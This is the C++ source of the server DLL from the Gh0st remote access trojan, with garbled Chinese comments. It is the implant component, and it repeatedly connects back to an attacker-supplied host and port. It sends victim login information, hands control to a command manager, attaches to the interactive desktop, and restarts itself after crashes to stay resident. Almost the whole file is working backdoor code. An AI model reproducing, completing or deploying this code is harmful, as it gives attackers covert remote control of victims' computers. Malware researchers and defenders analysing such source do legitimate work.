// ServerDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "ClientSocket.h"
#include "Login.h"
#include "KernelManager.h"
#include "resource.h"


enum
{
	    NOT_CONNECT,                //  ��û������
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};


char  g_strSvchostName[MAX_PATH];
char  g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

HINSTANCE g_hInstance = NULL;

DWORD WINAPI MyMain(char *lpServiceName);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
	    g_hInstance = (HINSTANCE)hModule;


		break;
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



extern "C" __declspec(dllexport) void TestRun(char* strHost,int nPort )
{
	strcpy(g_strHost,strHost);    //�������ߵ�ַ    //���������ֵ�����ɼ��س���Exe�����
	g_dwPort = nPort;             //�������߶˿�
	HANDLE hThread = MyCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MyMain, 
		(LPVOID)g_strHost,0,NULL);                //���ﹹ����һ���Լ��Ĵ����̺߳���

	



	//����ȴ��߳̽���
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);     
}


DWORD WINAPI MyMain(char *lpServiceName)
{
	char	strServiceName[256] = {0};     //�����ƶ˵�IP 
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;

	// Set Window Station
	//--������ͬ���ڽ���
	HWINSTA hOldStation = GetProcessWindowStation();    //���ܻ�ȡһ�����,���ý��̵ĵ�ǰ����
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);   //����ָ���Ĵ���վ  XP��Ĭ�ϴ���վ
	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //���ñ����̴���Ϊwinsta0  // ����һ������վ�����ý��̣��Ա�ý����ܹ����ʴ���վ��Ķ��������桢�������ȫ��ԭ��
	}



	if (g_hInstance != NULL)   //g_hInstance ��ֵҪ��Dll����ڽ��и�ֵ
	{
		//�Լ�������һ������Υ��Ĵ������� ��������˴��� ����ϵͳ�ͻ����bad_exception
		SetUnhandledExceptionFilter(bad_exception);  //������Ǵ�����Ļص�������
		
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // ����¼���
		
		hInstallMutex = CreateMutex(NULL,true,g_strHost);  //�û�������ֻ����һ̨PCӵ��һ��ʵ��
	}


	CClientSocket socketClient;    //��ʼ���׽��ֿ�
	

	BYTE  bBreakError = NOT_CONNECT;

	char	*lpszHost = NULL;
	DWORD	dwPort    = 0;

	while (1)
	{
		if (bBreakError != NOT_CONNECT)
		{


		}

		lpszHost = g_strHost;    //�����ƶ˵�IP
		dwPort   = g_dwPort;     //���ߵĶ˿�


		DWORD dwTickCount = GetTickCount();   //5
		//����Connect���������ض˷�������
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //���Ӵ�����������ѭ��  �ȴ��ٴ�����  һ�����ӳɹ��������ǵ������Ʒ��͵�½����
			continue;
		}

		DWORD dwExitCode = SOCKET_ERROR;      //GetTickCount() - dwTickCount �������ٵ� û��̫����˼
		SendLoginInfo(strServiceName, &socketClient, 
			GetTickCount() - dwTickCount); //strServiceName�����ƶ˵�IP
                               //����this
		CKernelManager	Manager(&socketClient, strServiceName, 
			g_dwServiceType, strKillEvent, lpszHost, dwPort);   //ע������CKernelManager ��CManager������
		socketClient.setManagerCallBack(&Manager);              //��socketClient���еĳ�Ա��ֵ

		// �ȴ����ƶ˷��ͼ��������ʱΪ10�룬��������,�Է����Ӵ���
		for (int i = 0; (i < 10 && !Manager.IsActived()); i++)
		{
			Sleep(1000);   //�ȴ����ǵĹ����߳���OnRead�������д��� ClientSocket.cp �ļ���
		}
		// 10���û���յ����ƶ˷����ļ������˵���Է����ǿ��ƶˣ���������
		if (!Manager.IsActived())
		{
			continue;
		}


		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		
		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);   //���¼�����UnInstallService�б�����
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);

			//���������ǵı��ض˶��ᱻ����������ѭ����


		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
		
		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}

	}
		
	return 0;
}




// �����쳣�����´�������
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{

	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MyMain,
		(LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}